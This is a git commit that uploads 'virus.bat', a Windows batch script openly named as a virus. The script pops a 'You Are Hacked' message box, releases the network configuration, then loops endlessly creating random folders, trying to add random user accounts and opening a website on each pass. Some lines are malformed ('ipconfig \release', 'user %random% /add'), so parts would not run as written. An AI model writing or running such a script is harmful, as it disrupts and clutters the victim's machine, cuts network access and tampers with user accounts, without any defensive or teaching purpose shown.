2d37b3fc8d998b3cd4a5e08723aac0ff3d4c8675
KatsuRs <80279833+KatsuRs@users.noreply.github.com>
2021-06-09 10:40:03 -0500

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,10 @@
+@echo off
+echo "X=Msgbox("You Are Hacked",0+16,"HA HA HA")">C:\LOL.vbs
+START C:\LOL.vbs
+ipconfig \release
+:A
+md Virus%Random%
+cd
+user %random% /add
+START www.en.softonic.com
+goto A
